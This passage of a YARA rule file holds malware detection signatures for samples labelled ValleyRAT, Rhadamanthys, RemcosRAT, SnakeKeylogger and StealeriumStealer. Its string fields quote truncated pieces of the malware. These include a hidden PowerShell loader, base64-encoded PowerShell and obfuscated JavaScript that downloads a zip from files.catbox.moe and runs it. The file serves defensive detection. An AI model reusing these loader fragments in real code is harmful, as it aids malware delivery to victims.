      $s3 = "var VectorHub = HolographicParser + '\\\\VirtualProcess.bat';" fullword ascii /* score: '26.00'*/
      $s4 = "SpectrumController.WriteLine(\"!sneejvlcmprphep! \\\"%iztegnxrb%i%iztegnxrb%p%iztegnxrb%h%iztegnxrb%g%iztegnxrb%v%iztegnxrb%t%iz" ascii /* score: '22.00'*/
      $s5 = "AQAAoADYAOQAsADEAMQA2ACwAMQAxADkALAA2ADkALAAxADEAOAAsADEAMAAxACwAMQAxADAALAAxADEANgAsADgANwAsADEAMQA0ACwAMQAwADUALAAxADEANgAsADE" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s6 = "AKAA3ADEALAAxADAAMQAsADEAMQA2ACwAOAAwACwAMQAxADQALAAxADEAMQAsADkAOQAsADYANQAsADEAMAAwACwAMQAwADAALAAxADEANAAsADEAMAAxACwAMQAxADU" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s7 = "AIAAiAEUAeABlAGMAdQB0AGkAbwBuAEMAbwBuAHQAZQB4AHQAIgAgAC0AVgBhAGwAdQBlAE8AbgBsAHkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGU" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s8 = "AdAB5AFMAZQByAHYAaQBjAGUAIAAkAHMAdwBlAGUAdABUAGEAcgBnAGUAdABTAGUAYwB1AHIAaQB0AHkATQBvAGQAdQBsAGUAIAAkAGIAZQByAHIAeQBJAG4AaQB0AGk" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s9 = "AdABpAG8AbgAgAD0AIAAkAGIAZQByAHIAeQBBAHUAdABvAG0AYQB0AGkAbwBuAFUAdABpAGwAaQB0AGkAZQBzAC4ARwBlAHQATQBlAHQAaABvAGQAKAAnAFMAYwBhAG4" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s10 = "AZQAoAFsASQBuAHQAUAB0AHIAXQA6ADoAQQBkAGQAKAAkAHMAdwBlAGUAdABUAHIAYQBjAGkAbgBnAEEAZABkAHIAZQBzAHMALAAgACQAcwB3AGUAZQB0AFAAYQB0AGM" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s11 = "AQgB1AGkAbABkAGUAcgAuAFMAZQB0AEkAbQBwAGwAZQBtAGUAbgB0AGEAdABpAG8AbgBGAGwAYQBnAHMAKABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s12 = "AZQB0AEkAbQBwAGwAZQBtAGUAbgB0AGEAdABpAG8AbgBGAGwAYQBnAHMAKABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAE0AZQB0AGgAbwBkAEk" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s13 = "AcgByAHkAUAByAG8AYwBlAGQAdQByAGUAQQBkAGQAcgBlAHMAcwAgAEAAKABbAHMAdAByAGkAbgBnAF0ALABbAFUASQBuAHQANgA0AF0ALgBNAGEAawBlAEIAeQBSAGU" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s14 = "AdAByAGEAdwBiAGUAcgByAHkATQBlAG0AbwByAHkATQBhAG4AYQBnAGUAcgA6ADoAVwByAGkAdABlAEIAeQB0AGUAKABbAEkAbgB0AFAAdAByAF0AOgA6AEEAZABkACg" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s15 = "AZgAgACgAJABiAGUAcgByAHkATgBlAHgAdABQAHIAbwB2AGkAZABlAHIAIAAtAGUAcQAgADAAIAAtAG8AcgAgACQAYgBlAHIAcgB5AE4AZQB4AHQAUAByAG8AdgBpAGQ" ascii /* base64 encoded string */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule ValleyRAT_signature__2829d152746bf5bd2dd080db2afd5e84_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_2829d152746bf5bd2dd080db2afd5e84(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "32707782f013eb238698096cb310efc3fdde8a6765a495037de479d93de4a88b"
   strings:
      $s1 = "NDg4MUVDQzgwMjAwMDA0OEM3ODQyNDY4MDEwMDAwMDAwMDAwMDA0OEM3ODQyNDAwMDEwMDAwMDAwMDAwMDA0OEM3ODQyNEEwMDIwMDAwMDAwMDAwMDA0OEM3ODQyNDYw" ascii /* base64 encoded string  */ /* score: '30.00'*/
      $s2 = "MjRCMDBBMDAwMDQ4ODFDNDkwMEEwMDAwNUY1RTVEQzNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M0ODg5NUMyNDIwNTU1NzQxNTQ0ODgxRUNBMDA2MDAwMDQ4OEIwNTQxNzUwMTAw" ascii /* base64 encoded string  */ /* score: '27.00'*/
      $s3 = "MDEwQzAwMDBCOTFDMDAwMDAwRTg5NzA5MDAwMEI5RkYwMDAwMDBFOEREMDUwMDAwRTg0ODIyMDAwMDg1QzA3NTIyODMzRDc5NjgwMTAwMDI3NDA1RThENjBCMDAwMEI5" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s4 = "NEM4QkRCNEQ4NURCMEY4NDlCMDEwMDAwNDU4NUVENzQxMUU4NDdFM0ZGRkY0QzhCRDg0ODYzNDcwNDRDMDNEOEVCMDM0QzhCREI0MTM4NUIxMDBGODQ3ODAxMDAwMDM5" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s5 = "NzA1MEJDMDAwMDAxMDAwMDAwMUZBMTAwMDAyREEyMDAwMEJGNkUwMTAwMDAwMDAwMDAxOTJEMEIwMDFCNjQ1MTAwMUI1NDUwMDAxQjM0NEYwMDFCMDE0QTAwMTREMDEy" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s6 = "MDEwMDAwMDA0ODZCQzkwRDBGQjY0QzBDNTgzQkMxNzUzMzhCNDQyNDY4NDg4QjhDMjQ0MDAxMDAwMDhCMDQ4MTg5ODQyNDE4MDEwMDAwOEI4NDI0MTgwMTAwMDA0ODhC" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s7 = "MjQwODU3NDg4M0VDMjA0ODhCRkE0ODhCRDk0ODNCQ0E3NDIxRTg4RUZGRkZGRjgwN0YxMDAwNzQwRTQ4OEI1NzA4NDg4QkNCRTgyMEZGRkZGRkVCMDg0ODhCNDcwODQ4" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s8 = "NEM4OTRBMDg0ODhCODNCMDAwMDAwMDQ4ODk0MjA4NDg4RDgzQTgwMDAwMDA0ODg5MDI0ODhCODNCMDAwMDAwMDQ4ODkxMEZGNEI2OEZGNDM2MDhCMDM0ODg5OTNCMDAw" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s9 = "Qjk4M0Y4MDE3NTEyNDg4QkNCRTg1QjA1MDAwMDg1QzAwRjg0QzUwMDAwMDBFQkEyODNGODAyMEY4NEQ3MDAwMDAwODNGODAzNzUxMjQ4OEJDQkU4QkIwMzAwMDA4NUMw" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s10 = "RUIwQTgzRjgwMzc1MDU4MDRDM0IwODA4NDg4RDRDM0IxMEJBQTAwRjAwMDBGRjE1NjVBQjAwMDA4NUMwMEY4NEMyRkRGRkZGRkY0NDNCMENFQjBEODA0QzNCMDg0MDQ4" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s11 = "OTRDMDQ4ODNDNDI4QzNDQ0NDNDg4RDA1QTlGNjAwMDA0ODg5MDE0ODhCMDJDNjQxMTAwMDQ4ODk0MTA4NDg4QkMxQzNDQ0NDQ0M0ODgzNzkwODAwNDg4RDA1OThGNjAw" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s12 = "MEQ0NDVEMDEwMDQ4OEIwQ0MxNDg4QjQ0MjQ2MDRDOEQ0QzI0NDg0ODhCMEMwODQ0MkJDNkZGMTVGOTlBMDAwMDg1QzA3NDBCMDM3NDI0NDg0NDNCRkU3RkI4RUIwOEZG" ascii /* base64 encoded string */ /* score: '24.00'*/
      $s13 = "NEM4RDFDMDZFQjAzNEM4QkRCNEQ4NURCMEY4NEJFMDAwMDAwODVGNjc0MEY0ODYzNzcwNEU4OUVFOUZGRkY0QzhEMUMwNkVCMDM0QzhCREI0MTM4NUIxMDBGODQ5RTAw" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s14 = "NDA0MThCRkMwRjFGNDQwMDAwNDg4QjZCMDg0QzhCMDQyRjQ5ODNGODBGNzYxMjQ5OEIwODMzRDI0ODhCMDlGRjE1MjQ2QzAxMDA0Qzg5MjQyRkZGQzY0ODgzQzcwODNC" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s15 = "NDgzQkYwNzM2ODQ4NjM0NDI0NTg0OEI5RkZGRkZGRkZGRkZGRkY3RjQ4M0JDMTczNTQ0ODhEMENCMDQ4MDNDMDQ4MDNDOTQ4M0JDODcyNDVFODJDRURGRkZGNDg4QkY4" ascii /* base64 encoded string  */ /* score: '24.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule Rhadamanthys_signature__32f3282581436269b3a75b6675fe3e08_imphash__88556db8 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_88556db8.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "88556db83f38d96d84a7a03aa667a66f25d5e6d3b71557db346f48eba429ca00"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v8.24.8-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s6 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__32f3282581436269b3a75b6675fe3e08_imphash__b7406ca9 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_b7406ca9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b7406ca9aa55a1047b23901fb2116d3c8879c8fff565e729628d9d151e72621e"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v4.64.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "UEU9US5TMUk" fullword ascii /* base64 encoded string  */ /* score: '11.00'*/
      $s6 = "zOqz:\\" fullword ascii /* score: '10.00'*/
      $s7 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s8 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s9 = "Z - MX" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__b9ef7445 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b9ef7445.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b9ef744551e414b8f59a4148f48425b5730e928a170d5161e7ddea959d50dc15"
   strings:
      $s1 = "powershell.exe -windowstyle hidden \"Get-DiskSNV;function Dogfights ($fortvivle){ $discoloureds=1;do {$canalside+=$fortvivle[$di" ascii /* score: '28.00'*/
      $s2 = "powershell.exe -windowstyle hidden \"Get-DiskSNV;function Dogfights ($fortvivle){ $discoloureds=1;do {$canalside+=$fortvivle[$di" ascii /* score: '25.00'*/
      $s3 = "asmart (Dogfights '-$-G-l-o b-A-L :-i.n-A l-t-E-r A-B-l Y =-( t-E,S T.--P-a-t-H- -$-L A-n-D-s r-e,T,s )') ;Ultrasmart (Dogfights" ascii /* score: '12.00'*/
      $s4 = " 'i$,GiL O b Ail,: b I,viA.ain e die = $igiLio.b.aili:iciUiR R A,N Tiwioirim,+ +i%% $ uiR tie,hiaiViE . CioiuiNit') ;$snakeship=" ascii /* score: '11.00'*/
      $s5 = "$urtehave[$bivaanede]}$benediktinerklostrets121=460266;$babroot=27166;Ultrasmart (Dogfights 'X$XgXl o.bXa.lX:Xo V e R.P rXIXn TX" ascii /* score: '10.00'*/
      $s6 = "  =F i=r=e=f=o x /=1=4=1=. 0';$fleretagersejendommes=Dogfights ' Ugsge r -gAgg EgngT';$snakeship=Dogfights '+h+t+t p+s+:+/ /,s+e" ascii /* score: '8.00'*/
      $s7 = " $approksimationernes);$snakeship=$urtehave[0];$jambolana=(Dogfights ',$ GIlIOIbIa L,:Iw aIrIfIU LI9.7.= NIEIw,- OIb jIE cITI IS" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 9KB and
      all of them
}

rule RemcosRAT_signature__be8817cf {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_be8817cf.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "be8817cf2fd720e68a960498df53ac488d87d4c691548fdaea16860344598aef"
   strings:
      $x1 = "function a(){var D=['MSXML2.XMLHTTP','BuildPath','SaveToFile','Files','send','open','1268220JVnmoN','Scripting.FileSystemObject'" ascii /* score: '34.00'*/
      $s2 = "/files.catbox.moe/kp50gv.zip','WScript.Shell','Items','238509zdmkbx','%TEMP%','random','Open','atEnd','GetFolder','CreateObject'" ascii /* score: '27.00'*/
      $s3 = "1673360DOGPcp','Close','NameSpace','Shell.Application','Type','GetExtensionName','responseBody','length','.zip','Name','charAt'," ascii /* score: '18.00'*/
      $s4 = "function a(){var D=['MSXML2.XMLHTTP','BuildPath','SaveToFile','Files','send','open','1268220JVnmoN','Scripting.FileSystemObject'" ascii /* score: '13.00'*/
      $s5 = "7f',h:'0x16f',i:'0x187',j:'0x17a',k:'0x18d',l:'0x16c'},y={c:'0x16a',d:'0x176',e:'0x172'},s=b,c=WScript[s(C.c)](s(C.d)),d=WScript" ascii /* score: '10.00'*/
      $s6 = "nction l(n,o){var v=s,p=WScript[v(A.c)](v('0x16e')),q=p[v(A.d)](n);if(!q)return![];if(!d[v(A.e)](o))d['CreateFolder'](o);return " ascii /* score: '10.00'*/
      $s7 = "e');p[w('0x17e')](q),p[w('0x168')](),c['Run']('\\x22'+q+'\\x22',0x1,![]);break;}o[w('0x17b')]();}}try{k(g,h)&&(l(h,i)&&(WScript[" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 7KB and
      1 of ($x*) and all of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__09197780 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_09197780.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "09197780e4de9aa1abaa44d580b3102138c6d3a03ab46b518f88f8c40dc882df"
   strings:
      $s1 = "eafa.exe" fullword wide /* score: '22.00'*/
      $s2 = "targetColumnName" fullword ascii /* score: '14.00'*/
      $s3 = "set_HasHeaders" fullword ascii /* score: '12.00'*/
      $s4 = "CSV Viewer - " fullword wide /* score: '12.00'*/
      $s5 = ".NET Framework 4.5A" fullword ascii /* score: '10.00'*/
      $s6 = "GetSelectedRowIndices" fullword ascii /* score: '9.00'*/
      $s7 = "GetColumnFormat" fullword ascii /* score: '9.00'*/
      $s8 = "GetSelectedRowCount" fullword ascii /* score: '9.00'*/
      $s9 = "GetFormattedColumnNames" fullword ascii /* score: '9.00'*/
      $s10 = "AddColumnDialog" fullword ascii /* score: '9.00'*/
      $s11 = "csvContent" fullword ascii /* score: '9.00'*/
      $s12 = "gnciiins" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule StealeriumStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file StealeriumStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "287b8d3a5d0326958711e0802dbc5dc3ad7df0ee4c22ffafa7a95d3fd416f9fd"
   strings:
      $s1 = "xntQ.exe" fullword wide /* score: '22.00'*/
      $s2 = "<GetHabitsCompletedToday>b__13_0" fullword ascii /* score: '12.00'*/
      $s3 = "GetHabitCompletions" fullword ascii /* score: '12.00'*/
      $s4 = "<GetHabitCompletions>b__12_1" fullword ascii /* score: '12.00'*/
      $s5 = "get_CompletedDates" fullword ascii /* score: '12.00'*/
      $s6 = "GetHabitsCompletedToday" fullword ascii /* score: '12.00'*/
      $s7 = "<GetHabitCompletions>b__12_0" fullword ascii /* score: '12.00'*/
      $s8 = "GetTodayCompletionPercentage" fullword ascii /* score: '12.00'*/
      $s9 = "GetTotalCompletions" fullword ascii /* score: '12.00'*/
      $s10 = "<GetCompletedTodayCount>b__6_0" fullword ascii /* score: '12.00'*/
      $s11 = "GetHabitsNotCompletedToday" fullword ascii /* score: '12.00'*/
      $s12 = "<GetHabitsNotCompletedToday>b__14_0" fullword ascii /* score: '12.00'*/
      $s13 = "<GetTotalCompletions>b__10_0" fullword ascii /* score: '12.00'*/
      $s14 = "GetCompletedTodayCount" fullword ascii /* score: '12.00'*/
      $s15 = "XF8pQy/=T" fullword ascii /* base64 encoded string */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 21000KB and
      8 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e36d13a1 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e36d13a1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e36d13a1a406cdb3b6f4d90653cb212d4c4f2e59ee7435fa43aa053ecb066b05"
   strings:
      $s1 = "sejw.exe" fullword wide /* score: '22.00'*/
      $s2 = "mailto:support@example.com" fullword wide /* score: '21.00'*/
      $s3 = "support@example.com" fullword wide /* score: '21.00'*/
      $s4 = "https://github.com/example/numberbaseconverter" fullword wide /* score: '17.00'*/
      $s5 = "github.com/example/numberbaseconverter" fullword wide /* score: '17.00'*/
      $s6 = "A simple and efficient number base converter that supports conversion between Binary (2), Octal (8), Decimal (10), and Hexadecim" wide /* score: '16.00'*/
      $s7 = "SSH, Telnet and Rlogin client" fullword ascii /* score: '15.00'*/
      $s8 = "get_TargetBase" fullword ascii /* score: '14.00'*/
      $s9 = "sejw.pdb" fullword ascii /* score: '14.00'*/
      $s10 = "set_TargetBase" fullword ascii /* score: '14.00'*/
      $s11 = "<TargetBase>k__BackingField" fullword ascii /* score: '14.00'*/
      $s12 = "targetBase" fullword ascii /* score: '14.00'*/
      $s13 = "{0:HH:mm:ss} - {1} ({2}) " fullword wide /* score: '12.00'*/
      $s14 = "3https://www.chiark.greenend.org.uk/~sgtatham/putty/0" fullword ascii /* score: '10.00'*/
      $s15 = "GetSelectedBase" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__8c26e452 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8c26e452.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8c26e45232a6156e0aa26e97891c87be699e0790bdf3f048fb9fde6b9b94e794"
   strings:
      $s1 = "BLsF.exe" fullword wide /* score: '22.00'*/
      $s2 = "BLsF.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "txtCommand" fullword wide /* score: '12.00'*/
      $s4 = "get_AssemblyDescription" fullword ascii /* score: '11.00'*/
      $s5 = "GetPlanet" fullword ascii /* score: '9.00'*/
      $s6 = "tbxContent" fullword wide /* score: '9.00'*/
      $s7 = "GetFleet" fullword ascii /* score: '9.00'*/
      $s8 = "Client Socket Program - Server Connected ..." fullword wide /* score: '9.00'*/
      $s9 = "get_AssemblyCompany" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e8333329 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e8333329.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e83333296efc27158b82016eb794f5dcc6ad9d5bf5c1519dfc382bd549f8a472"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD^V" fullword ascii /* score: '27.00'*/
      $s2 = "yGe.exe" fullword wide /* score: '19.00'*/
      $s3 = "!!!5!!!5!!!" fullword ascii /* score: '18.00'*/ /* hex encoded string 'U' */
      $s4 = "https://www.facebook.com/mohammed.telkhoukhe" fullword wide /* score: '17.00'*/
      $s5 = "https://www.instagram.com/m.tel18/" fullword wide /* score: '17.00'*/
      $s6 = "https://www.linkedin.com/in/mohamed-telkhoukhe-419019246/" fullword wide /* score: '17.00'*/
      $s7 = "logoPictureBox.Image" fullword wide /* score: '12.00'*/
      $s8 = "K@@@@@" fullword ascii /* reversed goodware string '@@@@@K' */ /* score: '11.00'*/
      $s9 = "get_AssemblyDescription" fullword ascii /* score: '11.00'*/
      $s10 = "yGe.pdb" fullword ascii /* score: '11.00'*/
      $s11 = "!!!E!!!" fullword ascii /* score: '10.00'*/
      $s12 = "!!!#!!!" fullword ascii /* score: '10.00'*/
      $s13 = "!!!<!!!" fullword ascii /* score: '10.00'*/
      $s14 = "!!!M!!!" fullword ascii /* score: '10.00'*/
      $s15 = "!!!n!!!" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__805e59d1 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_805e59d1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "805e59d142a1b2539d79732417912388b5ceb70cedee8f736d755705c9ae977a"
   strings:
      $s1 = "UbBi.exe" fullword wide /* score: '22.00'*/
      $s2 = "targetColumnName" fullword ascii /* score: '14.00'*/
      $s3 = "UbBi.pdb" fullword ascii /* score: '14.00'*/
      $s4 = "set_HasHeaders" fullword ascii /* score: '12.00'*/
      $s5 = "CSV Viewer - " fullword wide /* score: '12.00'*/
      $s6 = "DxYK.jVR" fullword ascii /* score: '10.00'*/
      $s7 = "GetSelectedRowIndices" fullword ascii /* score: '9.00'*/
      $s8 = "GetColumnFormat" fullword ascii /* score: '9.00'*/
      $s9 = "GetSelectedRowCount" fullword ascii /* score: '9.00'*/
      $s10 = "GetFormattedColumnNames" fullword ascii /* score: '9.00'*/
      $s11 = "AddColumnDialog" fullword ascii /* score: '9.00'*/
      $s12 = "csvContent" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__14d544af {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_14d544af.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "14d544afc723fdbda5021743448b807968e5ba3a68310885e7aeb9f2b8cb8fa1"
   strings:
      $s1 = "gDek.exe" fullword wide /* score: '22.00'*/
      $s2 = "CommonDialog.Form1.resources" fullword ascii /* score: '15.00'*/
      $s3 = "BatchProcessing" fullword ascii /* score: '15.00'*/
      $s4 = "tNjdKb0ZG" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s5 = "gDek.pdb" fullword ascii /* score: '14.00'*/
      $s6 = "\\test.jpg" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__81467731 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_81467731.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "81467731cad7caa88c63f9cc0949efd53c6e0853eda90cab81993a2e567de8cd"
   strings:
      $s1 = "FaVE.exe" fullword wide /* score: '22.00'*/
      $s2 = "CommonDialog.Form1.resources" fullword ascii /* score: '15.00'*/
      $s3 = "BatchProcessing" fullword ascii /* score: '15.00'*/
      $s4 = "FaVE.pdb" fullword ascii /* score: '14.00'*/
      $s5 = "!{79|\";+" fullword ascii /* score: '9.00'*/ /* hex encoded string 'y' */
      $s6 = "\\test.jpg" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ed68e937 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ed68e937.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ed68e937c49334eb99ff5ca7bb6b7c45645c3335c11f344f460378a5991323a5"
   strings:
      $s1 = "lZGG.exe" fullword wide /* score: '22.00'*/
      $s2 = "lZGG.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "Version control systems like Git allow developers to track changes, collaborate effectively, and maintain a complete history of " wide /* score: '13.00'*/
      $s4 = "The best way to learn programming is by practicing regularly, reading other people's code, and constantly challenging yourself w" wide /* score: '12.00'*/
      $s5 = "GetWordCount" fullword ascii /* score: '9.00'*/
      $s6 = "get_TimeElapsed" fullword ascii /* score: '9.00'*/
      $s7 = "get_Accuracy" fullword ascii /* score: '9.00'*/
      $s8 = "get_TestDate" fullword ascii /* score: '9.00'*/
      $s9 = "GetRandomSampleText" fullword ascii /* score: '9.00'*/
      $s10 = "GetCharacterCount" fullword ascii /* score: '9.00'*/
      $s11 = "Test Complete!" fullword wide /* score: '9.00'*/
      $s12 = "Programming is not just about writing code; it's about solving problems, creating solutions, and bringing ideas to life through " wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e83387ea {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e83387ea.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e83387eaf804e1f901c10a215a2323211f36a4697eed30486e7018f62bf710c3"
   strings:
      $s1 = "PKYY.exe" fullword wide /* score: '22.00'*/
      $s2 = "PKYY.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "Version control systems like Git allow developers to track changes, collaborate effectively, and maintain a complete history of " wide /* score: '13.00'*/
      $s4 = "The best way to learn programming is by practicing regularly, reading other people's code, and constantly challenging yourself w" wide /* score: '12.00'*/
      $s5 = "GetWordCount" fullword ascii /* score: '9.00'*/
      $s6 = "get_TimeElapsed" fullword ascii /* score: '9.00'*/
      $s7 = "get_Accuracy" fullword ascii /* score: '9.00'*/
      $s8 = "get_TestDate" fullword ascii /* score: '9.00'*/
      $s9 = "GetRandomSampleText" fullword ascii /* score: '9.00'*/
      $s10 = "GetCharacterCount" fullword ascii /* score: '9.00'*/
      $s11 = "Test Complete!" fullword wide /* score: '9.00'*/
      $s12 = "Programming is not just about writing code; it's about solving problems, creating solutions, and bringing ideas to life through " wide /* score: '9.00'*/
      $s13 = "* &|2{" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4620e415 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4620e415.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4620e415f8bcd713bdfbcba4e710e79c2e057d2e15dbbe2c3a39e8a229563038"
   strings:
